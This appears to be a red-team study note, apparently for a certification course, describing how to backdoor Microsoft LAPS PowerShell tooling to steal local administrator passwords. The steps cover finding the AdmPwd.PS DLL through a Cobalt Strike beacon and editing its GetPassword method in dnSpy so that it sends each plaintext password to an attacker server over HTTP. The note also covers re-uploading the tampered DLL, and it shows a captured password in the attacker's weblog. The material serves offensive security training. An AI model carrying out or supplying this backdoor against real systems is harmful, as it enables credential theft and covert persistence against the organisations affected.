
#### 🖊️ Obtain a copy of passwords

We can try backdooring the LAPS tooling to get our hands in a copy of the passwords.

Requirements:
- ``Get-AdmPwdPassword`` installed on the machine

###### 📔 via Cobalt Strike

1) Check if the LAPS PowerShell modules can be found

```
beacon> ls
[*] Listing: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/16/2022 13:04:13   en-US
 24kb     fil     05/05/2021 12:04:14   AdmPwd.PS.dll
 5kb      fil     04/28/2021 18:56:38   AdmPwd.PS.format.ps1xml
 4kb      fil     04/28/2021 18:56:38   AdmPwd.PS.psd1
 26kb     fil     05/05/2021 12:04:14   AdmPwd.Utils.dll
```

2) Since PowerShell heavily utilises the .NET Framework, the DLLs here are written in C# which makes them fairly trivial to download, modify and re-upload.  Download `AdmPwd.PS.dll` and `AdmPwd.Utils.dll`, sync them to your attacking machine and open AdmPwd.PS.dll with dnSpy.  Use the Assembly Explorer to drill down into the DLL, namespaces and classes until you find the `GetPassword` method.

![[dnspy.png]]

3) This method calls `DirectoryUtils.GetPasswordInfo` which returns a `PasswordInfo` object.  You can click on the name and dnSpy will take you to the class definition.  It contains properties for `ComputerName`, `DistinguishedName`, `Password` and `ExpirationTimestamp`.  The password is simply the plaintext password that is shown to the admin.

Let's modify the code to send the plaintext passwords to us over an HTTP GET request.

⚠ This is obviously an irresponsible method to use in the real world, because the plaintext password is being sent unencrypted over the wire.  This is just an example.

4) Go back to the GetPassword method, right-click somewhere in the main window and select _Edit Method_.  The first thing we need to do is add a new assembly reference, using the little button at the bottom of the edit window.

![[add-reference.png]]

5) Use the search box to find and add `System.Net`. 
This code will simply instantiate a new `WebClient` and call the `DownloadString` method, passing the computer name and password in the URI.

![[backdoor.png]]

6) Once the modifications are in place, click the _Compile_ button in the bottom-right of the edit window.  Then select _File > Save Module_ to write the changes to disk.  Upload the DLL back to the target to overwrite the existing file.
7) One downside to this tactic is that it will break the digital signature of the DLL, but it will not prevent PowerShell from using it.

`beacon> powershell Get-AuthenticodeSignature *.dll`

8) Grab the LAPS password for a computer.

```
PS C:\Users\nlamb> Get-AdmPwdPassword -ComputerName sql-2 | fl

ComputerName        : SQL-2
DistinguishedName   : CN=SQL-2,OU=SQL Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io
Password            : VloWch1sc5Hl40
ExpirationTimestamp : 9/17/2022 12:46:28 PM
```

10) You should see a corresponding hit in your CS weblog.

```
09/14 11:49:32 visit (port 80) from: 10.10.122.254
	Request: GET /
	Response: 404 Not Found
	null
	= Form Data=
	computer   = SQL-2
	pass       = VloWch1sc5Hl40
```


#### ⚠ Opsec




### Properties
---
📆 created   {{28-02-2024}} 09:42
🏷️ tags: #redteam #crto 

---

